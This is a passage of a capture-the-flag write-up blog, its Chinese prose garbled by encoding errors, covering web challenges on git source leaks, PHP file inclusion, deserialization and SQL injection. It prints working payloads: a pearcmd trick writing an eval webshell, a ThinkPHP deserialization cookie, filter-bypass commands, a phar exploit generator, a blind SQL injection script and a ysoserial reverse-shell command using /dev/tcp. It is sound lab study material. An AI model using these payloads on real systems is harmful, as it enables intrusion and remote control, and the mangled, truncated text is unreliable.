title="Yesec no drumsticks 5"></a>Yesec no drumsticks 5</h3><h4 id="gitå·¥ä½œåŸç†"><a href="#gitå·¥ä½œåŸç†" class="headerlink" title="gitå·¥ä½œåŸç†"></a>gitå·¥ä½œåŸç†</h4><img src="E:\typora img\git-command.jpg" alt="img" style="zoom:150%;" /><ul><li>workspaceï¼šå·¥ä½œåŒºâ€“æœ¬åœ°ç›®å½•ï¼ˆæ¯”å¦‚æˆ‘<code>git init Test</code>åˆ›å»ºäº†ä¸€ä¸ªç©ºä»“åº“ï¼Œé‚£ä¹ˆ<code>Test</code>è¿™ä¸ªç›®å½•å°±æ˜¯workspaceï¼‰</li><li>staging areaï¼šæš‚å­˜åŒº&#x2F;ç¼“å­˜åŒºâ€“.gitç›®å½•ä¸‹çš„indexæ–‡ä»¶ï¼ˆ<code>git add</code> æˆ–è€…<code>git stash</code>ï¼‰</li><li>local repositoryï¼šç‰ˆæœ¬åº“æˆ–æœ¬åœ°ä»“åº“â€“.gitç›®å½•ä¸‹çš„objectsç›®å½•</li><li>remote repositoryï¼šè¿œç¨‹ä»“åº“â€“github</li></ul><p>ä»¥æœ¬é¢˜ä¸ºä¾‹ï¼Œå…¶<code>.git</code>ç›®å½•å¦‚ä¸‹</p><p><img src="/../images/image-20221020162618015-1686150281425.png" alt="image-20221020162618015"></p><h4 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h4><p><img src="/../images/image-20221020163752820-1686150281425.png" alt="image-20221020163752820"></p><p>indexä¸­æœ‰flag.txtæ–‡ä»¶</p><p>æ¢å¤ç¼“å­˜å·¥ä½œåŒº<code>git stash pop</code></p><p><img src="/../images/image-20221020163917173-1686150281426.png" alt="image-20221020163917173"></p><p>å›æ»š<code>git reset --hard commit_id</code>åï¼Œè¯»å–flag.txtå¾—åˆ°<code>flag&#123;Yesec#1s#c@ibi&#125;</code></p><h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>æºç æ³„éœ²</p><ol><li><p>gitå›æ»š</p><p>æŸ¥çœ‹å†å²ç‰ˆæœ¬</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git log</span><br></pre></td></tr></table></figure><p>å›æ»šåˆ°å†å²ç‰ˆæœ¬</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git reset --hard commit_id</span><br></pre></td></tr></table></figure><blockquote><p>å®é™…ä¸Šå°±æ˜¯å°†HEADæŒ‡å‘commit_id</p></blockquote></li><li><p>gitç¼“å­˜</p><p>å°†å½“å‰å·¥ä½œåŒºç¼“å­˜</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git stash</span><br></pre></td></tr></table></figure><p>æ¢å¤ç¼“å­˜</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git stash pop</span><br></pre></td></tr></table></figure><p>å›æ»šåˆ°ç¼“å­˜ç‰ˆæœ¬</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git reset --hard commit_id</span><br></pre></td></tr></table></figure></li></ol><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h3 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h3><h4 id="ezapi"><a href="#ezapi" class="headerlink" title="ezapi"></a>ezapi</h4><p>graphql</p><p>æ¼æ´ï¼š<a href="https://mp.weixin.qq.com/s/gp2jGrLPllsh5xn7vn9BwQ">https://mp.weixin.qq.com/s/gp2jGrLPllsh5xn7vn9BwQ</a></p><p>ä½¿ç”¨è¯­æ³•ï¼š<a href="https://blog.csdn.net/weixin_39130261/article/details/118547853">https://blog.csdn.net/weixin_39130261/article/details/118547853</a></p><h3 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h3><h4 id="IncludeTwo"><a href="#IncludeTwo" class="headerlink" title="IncludeTwo"></a>IncludeTwo</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//Can you get shell? RCE via LFI if you get some trick,this question will be so easy!</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/base64|rot13|filter/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>].<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Hacker!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼ˆLFIï¼‰ç»•è¿‡åç¼€åæ·»åŠ ï¼Œä½¿ç”¨pearcmd.phpç»•è¿‡ã€‚</p><p>pç¥çš„æ–‡ç« ï¼š<a href="https://tttang.com/archive/1312/#toc_0x06-pearcmdphp">https://tttang.com/archive/1312/#toc_0x06-pearcmdphp</a></p><blockquote><p>peclæ˜¯PHPä¸­ç”¨äºç®¡ç†æ‰©å±•è€Œä½¿ç”¨çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œè€Œpearæ˜¯peclä¾èµ–çš„ç±»åº“ã€‚(ç±»ä¼¼äºpythonä¸­çš„pip)åœ¨7.3åŠä»¥å‰ï¼Œpecl&#x2F;pearæ˜¯é»˜è®¤å®‰è£…çš„ï¼›åœ¨7.4åŠä»¥åï¼Œéœ€è¦æˆ‘ä»¬åœ¨ç¼–è¯‘PHPçš„æ—¶å€™æŒ‡å®š<code>--with-pear</code>æ‰ä¼šå®‰è£…ã€‚</p><p>ä¸è¿‡ï¼Œåœ¨Dockerä»»æ„ç‰ˆæœ¬é•œåƒä¸­ï¼Œpcel&#x2F;pearéƒ½ä¼šè¢«é»˜è®¤å®‰è£…ï¼Œå®‰è£…çš„è·¯å¾„åœ¨<code>/usr/local/lib/php</code></p><p>pearä¸­æœ‰ä¸€ä¸ªå‘½ä»¤config-createï¼Œé˜…è¯»å…¶ä»£ç å’Œå¸®åŠ©ï¼Œå¯ä»¥çŸ¥é“ï¼Œè¿™ä¸ªå‘½ä»¤éœ€è¦ä¼ å…¥ä¸¤ä¸ªå‚æ•°ï¼Œå…¶ä¸­ç¬¬äºŒä¸ªå‚æ•°æ˜¯å†™å…¥çš„æ–‡ä»¶è·¯å¾„ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¼šè¢«å†™å…¥åˆ°è¿™ä¸ªæ–‡ä»¶ä¸­ã€‚</p></blockquote><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/<span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])<span class="meta">?&gt;</span>+/tmp/hello.php</span><br></pre></td></tr></table></figure><p>ç„¶åä¸€å¥è¯æœ¨é©¬å°±ä¼šè¢«å†™å…¥&#x2F;tmp&#x2F;hello.phpä¸­ï¼Œæˆ‘ä»¬åªéœ€åŒ…å«è¿™ä¸ªæ–‡ä»¶å³å¯ã€‚</p><h4 id="Maybe-You-Have-To-think-More"><a href="#Maybe-You-Have-To-think-More" class="headerlink" title="Maybe You Have To think More"></a>Maybe You Have To think More</h4><p>5.1.41LTS ThinkPHPæ¡†æ¶ååºåˆ—åŒ–æ¼æ´<a href="https://www.freebuf.com/vuls/269882.html">https://www.freebuf.com/vuls/269882.html</a></p><p>è¿™é“é¢˜ååºåˆ—åŒ–ç‚¹åœ¨cookieä¸­</p><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cookie:</span><br><span class="line">TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo1OiJldGhhbiI7YToyOntpOjA7czozOiJkaXIiO2k6MTtzOjQ6ImNhbGMiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo1OiJldGhhbiI7TzoxMzoidGhpbmtcUmVxdWVzdCI6Mzp7czo3OiIAKgBob29rIjthOjE6e3M6NzoidmlzaWJsZSI7YToyOntpOjA7cjo5O2k6MTtzOjY6ImlzQWpheCI7fX1zOjk6IgAqAGZpbHRlciI7czo2OiJzeXN0ZW0iO3M6OToiACoAY29uZmlnIjthOjE6e3M6ODoidmFyX2FqYXgiO3M6MDoiIjt9fX19fX0=&amp;id=whoami</span><br><span class="line">    </span><br><span class="line">?dajs=ls</span><br></pre></td></tr></table></figure><p>flagåœ¨ç¯å¢ƒå˜é‡é‡Œã€‚</p><h3 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h3><h4 id="So-Baby-RCE"><a href="#So-Baby-RCE" class="headerlink" title="So Baby RCE"></a>So Baby RCE</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|echo|cat|tac|base|sh|more|less|tail|vi|head|nl|env|fl|\||;|\^|\&#x27;|\]|&quot;|&lt;|&gt;|`|\/| |\\\\|\*/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]))&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;Don&#x27;t Hack Me&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†å¾ˆå¤šã€‚ä¸»è¦æ˜¯</p><ul><li><p>å…³é”®è¯ç»•è¿‡</p><p>é€šé…ç¬¦ï¼Œæ’å…¥ç©ºå­—ç¬¦ç»•è¿‡ç­‰ç­‰</p></li><li><p>ï¼›ç»•è¿‡</p><p>%0aæˆ–è€…&amp;&amp;ç»•è¿‡</p></li><li><p>&#x2F;ç»•è¿‡</p><p><code>ls /</code> &#x3D;&#x3D; <code>cd è·¯å¾„ï¼›ls</code></p><p>è¿”å›ä¸Šçº§ç›®å½• <code>cd ..</code></p></li><li><p>ç©ºæ ¼ç»•è¿‡</p><p><code>$&#123;IFS&#125;</code>ç­‰ç­‰</p></li></ul><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?cmd=cd$&#123;IFS&#125;..%<span class="number">0</span>acd$&#123;IFS&#125;..%<span class="number">0</span>acd$&#123;IFS&#125;..%<span class="number">0</span>aca$<span class="number">1</span>t$&#123;IFS&#125;ffff$<span class="number">1</span>llllaaaaggggg</span><br></pre></td></tr></table></figure><h4 id="BabySSTI-Two"><a href="#BabySSTI-Two" class="headerlink" title="BabySSTI_Two"></a>BabySSTI_Two</h4><p>unicodeç¼–ç ç»•è¿‡ï¼Œcatch_warningsè¢«è¿‡æ»¤ï¼Œæ¢ä¸€ä¸ªç±»æ¯”å¦‚os._wrap_closeå°±å¥½äº†ã€‚</p><h4 id="UnserializeThree"><a href="#UnserializeThree" class="headerlink" title="UnserializeThree"></a>UnserializeThree</h4><p>è€ƒç‚¹ï¼špharååºåˆ—åŒ–ï¼Œ#ç»•è¿‡</p><p>æ–‡ä»¶ä¸Šä¼ ç»™å‡ºä¸Šä¼ åæ–‡ä»¶è·¯å¾„</p><p>æ³¨é‡Šä¸­æç¤ºclass.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&gt;|&lt;|\?|php|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%0a&quot;</span>).<span class="string">&quot;/i&quot;</span>,<span class="variable">$this</span>-&gt;cmd))&#123;</span><br><span class="line">            <span class="comment">//Same point ,can you bypass me again?</span></span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;#&quot;</span>.<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;No!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">file_exists</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>#ç»•è¿‡</p><ol><li>é—­åˆphpæ ‡ç­¾</li><li>\n</li><li>\r</li></ol><p>è¿™é‡Œåªèƒ½ç”¨\rã€‚</p><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Evil</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;\rsystem(&#x27;cat /flag&#x27;);&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&gt;|&lt;|\?|php|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%0a&quot;</span>).<span class="string">&quot;/i&quot;</span>,<span class="variable">$this</span>-&gt;cmd))&#123;</span><br><span class="line">                <span class="comment">//Same point ,can you bypass me again?</span></span><br><span class="line">                <span class="keyword">eval</span>(<span class="string">&quot;#&quot;</span>.<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;#&quot;</span>.<span class="variable language_">$this</span>-&gt;cmd;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;No!&quot;</span>.<span class="variable language_">$this</span>-&gt;cmd;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;test.phar&quot;</span>);<span class="comment">//ç”Ÿæˆçš„å‹ç¼©æ–‡ä»¶åä¸ºtest.phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="comment">//è®¾ç½®stub</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line">    <span class="comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Evil</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line">    <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">    <span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å°†ç”Ÿæˆçš„pharæ”¹å›¾ç‰‡åç¼€åä¸Šä¼ åï¼Œåœ¨class.phpä¸‹ç”¨pharåè®®è®¿é—®ï¼ˆåªè¦æ˜¯pharæ–‡ä»¶ï¼Œåç¼€åæ˜¯ä»€ä¹ˆéƒ½å¯ä»¥è§£æï¼‰</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/<span class="keyword">class</span>.php?file=phar:<span class="comment">//file_path</span></span><br></pre></td></tr></table></figure><h4 id="åˆä¸€ä¸ªSQL"><a href="#åˆä¸€ä¸ªSQL" class="headerlink" title="åˆä¸€ä¸ªSQL"></a>åˆä¸€ä¸ªSQL</h4><p>0^0å’Œ0^1ï¼Œå›æ˜¾ä¸¤ç§æƒ…å†µï¼ŒçŒœæµ‹ä½¿ç”¨ç›²æ³¨ã€‚</p><p>payload</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#æ•°å­—</span></span><br><span class="line"><span class="comment">#0^(ascii(substr((select(database())),&#123;&#125;,1))&gt;&#123;&#125;)</span></span><br><span class="line"><span class="comment">#å•å¼•å·</span></span><br><span class="line"><span class="comment">#0&#x27; or (ascii(substr((select(database())),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://afe4417f-e94a-484b-bd96-f8a0e17414a5.node4.buuoj.cn:81/comments.php&quot;</span></span><br><span class="line">url2=<span class="string">&quot;http://14a849d8-1ab5-4d00-a4d6-62d9671f66b0.node4.buuoj.cn:81/comments.php?name=c&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SqlBlind</span>():</span><br><span class="line"></span><br><span class="line">    result=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">        left = <span class="number">32</span></span><br><span class="line">        right = <span class="number">127</span></span><br><span class="line">        mid=(left+right)//<span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> left &lt; right:</span><br><span class="line"><span class="comment">#wfy_admin,wfy_comments,wfy_information</span></span><br><span class="line"><span class="comment">#where(user=&#x27;f1ag_is_here&#x27;)</span></span><br><span class="line">            params=&#123;</span><br><span class="line">                <span class="comment"># &#x27;name&#x27;:&quot;0^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(i,mid),</span></span><br><span class="line">                <span class="comment"># &#x27;name&#x27;:&quot;c&quot;,</span></span><br><span class="line">                <span class="comment"># &#x27;comment&#x27;:&quot;hack&quot;,</span></span><br><span class="line">                <span class="comment"># &#x27;name&#x27;:&quot;0^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(i,mid),</span></span><br><span class="line">                <span class="comment"># &#x27;name&#x27;:&quot;0^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;wfy_information&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(i,mid),</span></span><br><span class="line">                 <span class="string">&#x27;name&#x27;</span>:<span class="string">&quot;0^(ord(substr((select(group_concat(text))from(wfy_comments)where(user=&#x27;f1ag_is_here&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(i,mid),</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment"># è¯·æ±‚æ–¹å¼</span></span><br><span class="line">            <span class="comment">#r=requests.get(url=url,params=params)</span></span><br><span class="line">            r=requests.post(url=url,data=params)</span><br><span class="line">            <span class="comment">#print(r.text)</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># é˜²æ­¢429</span></span><br><span class="line">            <span class="keyword">if</span> r.status_code == <span class="number">429</span>:</span><br><span class="line">                time.sleep(<span class="number">0.5</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#r=requests.get(url=url2)</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># ç¼–ç </span></span><br><span class="line">            <span class="comment">#r=str(r.json())</span></span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">            <span class="comment"># Trueçš„æ ‡å¿—  0çš„ä¸ªæ•°</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;å¥½è€¶&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="comment"># if r.text.count(&#x27;0&#x27;)==i:</span></span><br><span class="line">                left = mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                right = mid</span><br><span class="line"></span><br><span class="line">            mid=(left+right)//<span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> left &lt;=<span class="number">32</span> <span class="keyword">or</span> right &gt;= <span class="number">127</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        result += <span class="built_in">chr</span>(mid)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+]&quot;</span>,result)</span><br><span class="line">                </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    SqlBlind()</span><br></pre></td></tr></table></figure><h4 id="Rome"><a href="#Rome" class="headerlink" title="Rome"></a>Rome</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="comment">/*    */</span> <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerController</span></span><br><span class="line"><span class="comment">/*    */</span> &#123;</span><br><span class="line"><span class="comment">/*    */</span>   <span class="meta">@GetMapping(&#123;&quot;/&quot;&#125;)</span></span><br><span class="line"><span class="comment">/*    */</span>   <span class="meta">@ResponseBody</span></span><br><span class="line"><span class="comment">/*    */</span>   <span class="keyword">public</span> String <span class="title function_">helloCTF</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">/* 19 */</span>     <span class="keyword">return</span> <span class="string">&quot;Do you like Jvav?&quot;</span>;</span><br><span class="line"><span class="comment">/*    */</span>   &#125;</span><br><span class="line"><span class="comment">/*    */</span>   <span class="meta">@PostMapping(&#123;&quot;/&quot;&#125;)</span></span><br><span class="line"><span class="comment">/*    */</span>   <span class="meta">@ResponseBody</span></span><br><span class="line"><span class="comment">/*    */</span>   <span class="keyword">public</span> String <span class="title function_">helloCTF</span><span class="params">(<span class="meta">@RequestParam</span> String EXP)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line"><span class="comment">/* 24 */</span>     <span class="keyword">if</span> (EXP.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line"><span class="comment">/* 25 */</span>       <span class="keyword">return</span> <span class="string">&quot;Do you know Rome Serializer?&quot;</span>;</span><br><span class="line"><span class="comment">/*    */</span>     &#125;</span><br><span class="line"><span class="comment">/* 27 */</span>     <span class="type">byte</span>[] exp = Base64.getDecoder().decode(EXP);</span><br><span class="line"><span class="comment">/* 28 */</span>     <span class="type">ByteArrayInputStream</span> <span class="variable">bytes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(exp);</span><br><span class="line"><span class="comment">/* 29 */</span>     <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bytes);</span><br><span class="line"><span class="comment">/* 30 */</span>     objectInputStream.readObject();</span><br><span class="line"><span class="comment">/* 31 */</span>     <span class="keyword">return</span> <span class="string">&quot;Do You like Jvav?&quot;</span>;</span><br><span class="line"><span class="comment">/*    */</span>   &#125;</span><br><span class="line"><span class="comment">/*    */</span> &#125;</span><br></pre></td></tr></table></figure><p>ååºåˆ—åŒ–ç‚¹</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">objectInputStream.readObject();</span><br></pre></td></tr></table></figure><p>ROMEååºåˆ—åŒ–åˆ†æ</p><p><a href="https://www.yulate.com/292.html">https://www.yulate.com/292.html</a></p><blockquote><p>javaç‰ˆæœ¬è¦jdk8u-121ç…§ç€æ–‡ç« æœ¬åœ°å¤ç°äº†ï¼Œä½†æ˜¯ç”¨ysoserialå†™äº†åå¼¹shellï¼Œé¢˜ç›®çš„å‘é€è¿‡å»ä¸å¯ä»¥</p></blockquote><p>è¿™å‘¨å‘ç°åªè¦æŠŠpayloadæ‹¿å»urlç¼–ç åå°±å¯ä»¥äº†ã€‚</p><p>è¿™é‡Œæ€è€ƒäº†å¾—å‡ºçš„ç»“æœæ˜¯</p><blockquote><p>RFC3986ä¸­æŒ‡å®šäº†ä»¥ä¸‹å­—ç¬¦ä¸ºä¿ç•™å­—ç¬¦ï¼š! * â€˜ ( ) ; : @ &amp; &#x3D; + $ , &#x2F; ? # [ ]</p><p>ã€€ã€€ä¸å®‰å…¨å­—ç¬¦ï¼šè¿˜æœ‰ä¸€äº›å­—ç¬¦ï¼Œå½“ä»–ä»¬ç›´æ¥æ”¾åœ¨URLä¸­çš„æ—¶å€™ï¼Œå¯èƒ½ä¼šå¼•èµ·è§£æç¨‹åºçš„æ­§ä¹‰ã€‚è¿™äº›å­—ç¬¦è¢«è§†ä¸ºä¸å®‰å…¨å­—ç¬¦ï¼ŒåŸå› æœ‰å¾ˆå¤šã€‚</p><ul><li>ç©ºæ ¼ï¼šUrl åœ¨ä¼ è¾“çš„è¿‡ç¨‹ï¼Œæˆ–è€…ç”¨æˆ·åœ¨æ’ç‰ˆçš„è¿‡ç¨‹ï¼Œæˆ–è€…æ–‡æœ¬å¤„ç†ç¨‹åºåœ¨å¤„ç†Urlçš„è¿‡ç¨‹ï¼Œéƒ½æœ‰å¯èƒ½å¼•å…¥æ— å…³ç´§è¦çš„ç©ºæ ¼ï¼Œæˆ–è€…å°†é‚£äº›æœ‰æ„ä¹‰çš„ç©ºæ ¼ç»™å»æ‰ã€‚</li><li>å¼•å·ä»¥åŠ&lt;&gt;ï¼šå¼•å·å’Œå°–æ‹¬å·é€šå¸¸ç”¨äºåœ¨æ™®é€šæ–‡æœ¬ä¸­èµ·åˆ°åˆ†éš”Urlçš„ä½œç”¨</li><li>#ï¼šé€šå¸¸ç”¨äºè¡¨ç¤ºä¹¦ç­¾æˆ–è€…é”šç‚¹</li><li>%ï¼šç™¾åˆ†å·æœ¬èº«ç”¨ä½œå¯¹ä¸å®‰å…¨å­—ç¬¦è¿›è¡Œç¼–ç æ—¶ä½¿ç”¨çš„ç‰¹æ®Šå­—ç¬¦ï¼Œå› æ­¤æœ¬èº«éœ€è¦ç¼–ç </li><li>{}|^[]&#96;~ï¼šæŸä¸€äº›ç½‘å…³æˆ–è€…ä¼ è¾“ä»£ç†ä¼šç¯¡æ”¹è¿™äº›å­—ç¬¦</li></ul></blockquote><p>è€Œbase64åŠ å¯†åå¯èƒ½ä¼šå‡ºç°<code>+,/,=</code></p><p>è§£é¢˜æ­¥éª¤</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar ROME &quot;bash -c &#123;echo,xxx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; 1.txt</span><br></pre></td></tr></table></figure><p>xxxä¸ºbase64åçš„<code>bash -i &gt;&amp; /dev/tcp/ip/2333 0&gt;&amp;1</code></p><p>è¿™é‡Œ<code>&gt; 1.txt</code>æ˜¯å› ä¸ºå¦‚æœæˆ‘åŠ äº†<code>|base64</code>ç”Ÿæˆäº†ä¹‹åä¼šå‡ºç°å…¶ä»–ç¬¦å·</p><p><img src="/../images/image-20221018174601257-1686150281426.png" alt="image-20221018174601257"></p><p>ç”¨pythonæˆ–è€…cyberchefæ¥base64åŠ å¯†</p><p>exp</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span 